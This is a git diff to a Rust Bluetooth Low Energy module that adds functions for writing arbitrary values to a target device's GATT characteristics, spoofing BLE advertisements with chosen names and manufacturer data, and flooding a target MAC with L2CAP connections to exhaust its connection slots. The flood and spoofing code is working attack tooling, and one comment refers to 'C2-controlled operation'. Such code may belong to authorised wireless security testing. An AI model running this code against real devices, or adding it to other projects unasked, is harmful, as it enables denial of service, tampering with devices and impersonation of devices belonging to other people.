@@ -1,5 +1,7 @@
 // Copyright 2025-2026 CEMAXECUTER LLC
 
+pub mod relay;
+
 use serde::{Deserialize, Serialize};
 use std::collections::HashMap;
 use std::sync::atomic::{AtomicBool, Ordering};
@@ -41,6 +43,17 @@ pub struct GattResult {
     pub mac: String,
     pub device_name: Option<String>,
     pub services: Vec<GattService>,
+    pub error: Option<String>,
+    pub timestamp: f64,
+}
+
+/// Result of a GATT write operation.
+#[derive(Debug, Clone, Serialize, Deserialize)]
+pub struct GattWriteResult {
+    pub mac: String,
+    pub service_uuid: String,
+    pub char_uuid: String,
+    pub success: bool,
     pub error: Option<String>,
     pub timestamp: f64,
 }
@@ -113,6 +126,355 @@ impl HciProber {
             }
         })
     }
+    /// Write a value to a specific GATT characteristic.
+    /// `data` is the raw bytes to write (hex-decoded by caller).
+    /// If `service_uuid` is None, searches all services for the characteristic.
+    pub fn write_characteristic(
+        &self,
+        mac: &str,
+        service_uuid: Option<&str>,
+        char_uuid: &str,
+        data: &[u8],
+    ) -> GattWriteResult {
+        let mac_owned = mac.to_string();
+        let char_uuid_owned = char_uuid.to_string();
+        let svc_uuid_owned = service_uuid.map(|s| s.to_string());
+        let data_owned = data.to_vec();
+        let now = std::time::SystemTime::now()
+            .duration_since(std::time::UNIX_EPOCH)
+            .unwrap_or_default()
+            .as_secs_f64();
+
+        self.rt.block_on(async {
+            match timeout(
+                GATT_TIMEOUT,
+                write_gatt_char(&mac_owned, svc_uuid_owned.as_deref(), &char_uuid_owned, &data_owned),
+            )
+            .await
+            {
+                Ok(Ok(svc)) => GattWriteResult {
+                    mac: mac_owned,
+                    service_uuid: svc,
+                    char_uuid: char_uuid_owned,
+                    success: true,
+                    error: None,
+                    timestamp: now,
+                },
+                Ok(Err(e)) => GattWriteResult {
+                    mac: mac_owned,
+                    service_uuid: svc_uuid_owned.unwrap_or_default(),
+                    char_uuid: char_uuid_owned,
+                    success: false,
+                    error: Some(e),
+                    timestamp: now,
+                },
+                Err(_) => GattWriteResult {
+                    mac: mac_owned,
+                    service_uuid: svc_uuid_owned.unwrap_or_default(),
+                    char_uuid: char_uuid_owned,
+                    success: false,
+                    error: Some("GATT write timed out".to_string()),
+                    timestamp: now,
+                },
+            }
+        })
+    }
+}
+
+// ---------------------------------------------------------------------------
+// Advertisement spoofing
+// ---------------------------------------------------------------------------
+
+/// Configuration for a spoofed BLE advertisement.
+#[derive(Debug, Clone, Serialize, Deserialize)]
+pub struct SpoofAdvConfig {
+    /// Local name to advertise
+    pub name: Option<String>,
+    /// Manufacturer data: company_id -> raw bytes
+    pub manufacturer_data: HashMap<u16, Vec<u8>>,
+    /// Service UUIDs to advertise
+    pub service_uuids: Vec<String>,
+    /// Service data: UUID -> raw bytes
+    pub service_data: HashMap<String, Vec<u8>>,
+    /// TX power level to include
+    pub tx_power: Option<i16>,
+    /// Whether to advertise as connectable (peripheral) vs broadcast
+    pub connectable: bool,
+    /// Duration in seconds (0 = until stopped)
+    pub duration_secs: u32,
+}
+
+/// Result of a spoof operation.
+#[derive(Debug, Clone, Serialize, Deserialize)]
+pub struct SpoofAdvResult {
+    pub success: bool,
+    pub error: Option<String>,
+    pub duration_secs: u32,
+    pub timestamp: f64,
+}
+
+/// Spoof a BLE advertisement using the system HCI adapter.
+/// Blocks for the specified duration, then stops advertising.
+pub fn spoof_advertisement(config: &SpoofAdvConfig) -> SpoofAdvResult {
+    let rt = match tokio::runtime::Builder::new_current_thread()
+        .enable_all()
+        .build()
+    {
+        Ok(rt) => rt,
+        Err(e) => {
+            return SpoofAdvResult {
+                success: false,
+                error: Some(format!("runtime error: {}", e)),
+                duration_secs: 0,
+                timestamp: now_ts(),
+            };
+        }
+    };
+
+    rt.block_on(async {
+        match run_spoof_adv(config).await {
+            Ok(duration) => SpoofAdvResult {
+                success: true,
+                error: None,
+                duration_secs: duration,
+                timestamp: now_ts(),
+            },
+            Err(e) => SpoofAdvResult {
+                success: false,
+                error: Some(e),
+                duration_secs: 0,
+                timestamp: now_ts(),
+            },
+        }
+    })
+}
+
+async fn run_spoof_adv(config: &SpoofAdvConfig) -> Result<u32, String> {
+    use bluer::adv;
+    use std::collections::BTreeMap;
+    use std::collections::BTreeSet;
+
+    let session = Session::new()
+        .await
+        .map_err(|e| format!("BlueZ session error: {}", e))?;
+    let adapter = session
+        .default_adapter()
+        .await
+        .map_err(|e| format!("no HCI adapter: {}", e))?;
+
+    if !adapter.is_powered().await.unwrap_or(false) {
+        return Err("HCI adapter not powered".into());
+    }
+
+    // Build the advertisement
+    let mut adv = adv::Advertisement {
+        advertisement_type: if config.connectable {
+            adv::Type::Peripheral
+        } else {
+            adv::Type::Broadcast
+        },
+        local_name: config.name.clone(),
+        ..Default::default()
+    };
+
+    // Service UUIDs
+    for uuid_str in &config.service_uuids {
+        if let Ok(uuid) = uuid_str.parse::<bluer::Uuid>() {
+            adv.service_uuids.insert(uuid);
+        }
+    }
+
+    // Manufacturer data
+    for (&company_id, data) in &config.manufacturer_data {
+        adv.manufacturer_data.insert(company_id, data.clone());
+    }
+
+    // Service data
+    for (uuid_str, data) in &config.service_data {
+        if let Ok(uuid) = uuid_str.parse::<bluer::Uuid>() {
+            adv.service_data.insert(uuid, data.clone());
+        }
+    }
+
+    // TX power
+    if let Some(tx) = config.tx_power {
+        adv.tx_power = Some(tx);
+    }
+
+    // Register the advertisement (starts broadcasting)
+    let handle = adapter
+        .advertise(adv)
+        .await
+        .map_err(|e| format!("failed to start advertising: {}", e))?;
+
+    eprintln!("HCI spoof: advertising started (connectable={})", config.connectable);
+
+    let duration = config.duration_secs;
+    if duration > 0 {
+        tokio::time::sleep(Duration::from_secs(duration as u64)).await;
+    } else {
+        // Run until adapter is powered off or process exits
+        // For C2-controlled operation, this would be cancelled externally
+        tokio::time::sleep(Duration::from_secs(3600)).await;
+    }
+
+    // Dropping the handle stops advertising
+    drop(handle);
+    eprintln!("HCI spoof: advertising stopped");
+
+    Ok(duration)
+}
+
+fn now_ts() -> f64 {
+    std::time::SystemTime::now()
+        .duration_since(std::time::UNIX_EPOCH)
+        .unwrap_or_default()
+        .as_secs_f64()
+}
+
+// ---------------------------------------------------------------------------
+// L2CAP connection flood
+// ---------------------------------------------------------------------------
+
+/// Configuration for L2CAP connection flood.
+#[derive(Debug, Clone, Serialize, Deserialize)]
+pub struct L2capFloodConfig {
+    pub mac: String,
+    /// Number of simultaneous connections to attempt
+    pub count: u32,
+    /// Duration in seconds to hold connections open
+    pub hold_secs: u32,
+    /// L2CAP PSM (Protocol Service Multiplexer) to target. 0 = ATT (default).
+    pub psm: u16,
+}
+
+/// Result of L2CAP flood operation.
+#[derive(Debug, Clone, Serialize, Deserialize)]
+pub struct L2capFloodResult {
+    pub connections_opened: u32,
+    pub connections_failed: u32,
+    pub success: bool,
+    pub error: Option<String>,
+    pub timestamp: f64,
+}
+
+/// Open multiple L2CAP connections to a target device to exhaust its
+/// connection slots. Blocks for `hold_secs` then disconnects all.
+pub fn l2cap_flood(config: &L2capFloodConfig) -> L2capFloodResult {
+    let rt = match tokio::runtime::Builder::new_current_thread()
+        .enable_all()
+        .build()
+    {
+        Ok(rt) => rt,
+        Err(e) => {
+            return L2capFloodResult {
+                connections_opened: 0,
+                connections_failed: 0,
+                success: false,
+                error: Some(format!("runtime error: {}", e)),
+                timestamp: now_ts(),
+            };
+        }
+    };
+
+    rt.block_on(async {
+        match run_l2cap_flood(config).await {
+            Ok(result) => result,
+            Err(e) => L2capFloodResult {
+                connections_opened: 0,
+                connections_failed: 0,
+                success: false,
+                error: Some(e),
+                timestamp: now_ts(),
+            },
+        }
+    })
+}
+
+async fn run_l2cap_flood(config: &L2capFloodConfig) -> Result<L2capFloodResult, String> {
+    let addr: Address = config
+        .mac
+        .parse()
+        .map_err(|e| format!("invalid MAC '{}': {}", config.mac, e))?;
+
+    let psm = if config.psm == 0 { 4 } else { config.psm }; // 4 = ATT
+
+    let sa = bluer::l2cap::SocketAddr {
+        addr,
+        addr_type: bluer::AddressType::LePublic,
+        psm,
+        cid: 0,
+    };
+
+    let mut opened = 0u32;
+    let mut failed = 0u32;
+    let mut sockets = Vec::new();
+
+    eprintln!("L2CAP flood: opening {} connections to {} (PSM {})",
+        config.count, config.mac, psm);
+
+    for i in 0..config.count {
+        match bluer::l2cap::Socket::new_stream() {
+            Ok(sock) => {
+                match tokio::time::timeout(
+                    Duration::from_secs(5),
+                    sock.connect(sa),
+                )
+                .await
+                {
+                    Ok(Ok(stream)) => {
+                        opened += 1;
+                        sockets.push(stream);
+                        if opened % 5 == 0 || i == config.count - 1 {
+                            eprintln!("L2CAP flood: {}/{} connections open", opened, i + 1);
+                        }
+                    }
+                    Ok(Err(e)) => {
+                        failed += 1;
+                        if failed <= 3 {
+                            eprintln!("L2CAP flood: connect #{} failed: {}", i + 1, e);
+                        }
+                    }
+                    Err(_) => {
+                        failed += 1;
+                        if failed <= 3 {
+                            eprintln!("L2CAP flood: connect #{} timed out", i + 1);
+                        }
+                    }
+                }
+            }
+            Err(e) => {
+                failed += 1;
+                if failed <= 3 {
+                    eprintln!("L2CAP flood: socket creation failed: {}", e);
+                }
+            }
+        }
+        // Small delay between connection attempts
+        tokio::time::sleep(Duration::from_millis(50)).await;
+    }
+
+    eprintln!(
+        "L2CAP flood: {} open, {} failed. Holding for {}s...",
+        opened, failed, config.hold_secs
+    );
+
+    if config.hold_secs > 0 {
+        tokio::time::sleep(Duration::from_secs(config.hold_secs as u64)).await;
+    }
+
+    // Drop all connections
+    let held = sockets.len();
+    drop(sockets);
+    eprintln!("L2CAP flood: released {} connections", held);
+
+    Ok(L2capFloodResult {
+        connections_opened: opened,
+        connections_failed: failed,
+        success: opened > 0,
+        error: None,
+        timestamp: now_ts(),
+    })
 }
 
 // ---------------------------------------------------------------------------
@@ -441,4 +803,126 @@ async fn discover_gatt(mac: &str) -> Result<GattResult, String> {
         error: None,
         timestamp: 0.0,
     })
+}
+
+/// Write a value to a specific GATT characteristic.
+/// Returns the service UUID that contained the characteristic.
+async fn write_gatt_char(
+    mac: &str,
+    service_uuid: Option<&str>,
+    char_uuid: &str,
+    data: &[u8],
+) -> Result<String, String> {
+    let addr: Address = mac
+        .parse()
+        .map_err(|e| format!("invalid MAC '{}': {}", mac, e))?;
+
+    let session = Session::new()
+        .await
+        .map_err(|e| format!("BlueZ session error: {}", e))?;
+    let adapter = session
+        .default_adapter()
+        .await
+        .map_err(|e| format!("no HCI adapter: {}", e))?;
+
+    // Start discovery to ensure BlueZ knows about the device
+    let _disco = adapter
+        .discover_devices()
+        .await
+        .map_err(|e| format!("discovery error: {}", e))?;
+
+    // Wait briefly for the device to appear
+    tokio::time::sleep(Duration::from_secs(1)).await;
+
+    let device = adapter
+        .device(addr)
+        .map_err(|e| format!("device {} not found: {}", mac, e))?;
+
+    let was_connected = device.is_connected().await.unwrap_or(false);
+    if !was_connected {
+        timeout(CONNECT_TIMEOUT, device.connect())
+            .await
+            .map_err(|_| format!("connect to {} timed out", mac))?
+            .map_err(|e| format!("connect to {} failed: {}", mac, e))?;
+    }
+
+    // Wait for service resolution
+    for _ in 0..50 {
+        if device.is_services_resolved().await.unwrap_or(false) {
+            break;
+        }
+        tokio::time::sleep(Duration::from_millis(100)).await;
+    }
+
+    let target_char_uuid: bluer::Uuid = char_uuid
+        .parse()
+        .map_err(|e| format!("invalid characteristic UUID '{}': {}", char_uuid, e))?;
+
+    let target_svc_uuid: Option<bluer::Uuid> = if let Some(s) = service_uuid {
+        Some(s.parse().map_err(|e| format!("invalid service UUID '{}': {}", s, e))?)
+    } else {
+        None
+    };
+
+    // Search services for the target characteristic
+    let svc_list = device
+        .services()
+        .await
+        .map_err(|e| format!("failed to enumerate services: {}", e))?;
+
+    for svc in &svc_list {
+        let svc_uuid_val = match svc.uuid().await {
+            Ok(u) => u,
+            Err(_) => continue,
+        };
+
+        // Filter by service UUID if specified
+        if let Some(ref target) = target_svc_uuid {
+            if svc_uuid_val != *target {
+                continue;
+            }
+        }
+
+        if let Ok(chars) = svc.characteristics().await {
+            for ch in &chars {
+                let ch_uuid_val = match ch.uuid().await {
+                    Ok(u) => u,
+                    Err(_) => continue,
+                };
+                if ch_uuid_val != target_char_uuid {
+                    continue;
+                }
+
+                // Found the characteristic -- attempt write
+                let flags = ch.flags().await.unwrap_or_default();
+                if flags.write || flags.write_without_response {
+                    ch.write(data)
+                        .await
+                        .map_err(|e| format!("write failed: {}", e))?;
+                } else {
+                    if !was_connected {
+                        let _ = device.disconnect().await;
+                    }
+                    return Err(format!(
+                        "characteristic {} does not support write (flags: {:?})",
+                        char_uuid,
+                        flags_to_strings(&flags)
+                    ));
+                }
+
+                if !was_connected {
+                    let _ = device.disconnect().await;
+                }
+                return Ok(svc_uuid_val.to_string());
+            }
+        }
+    }
+
+    if !was_connected {
+        let _ = device.disconnect().await;
+    }
+    Err(format!(
+        "characteristic {} not found on device {}",
+        char_uuid, mac
+    ))
 }
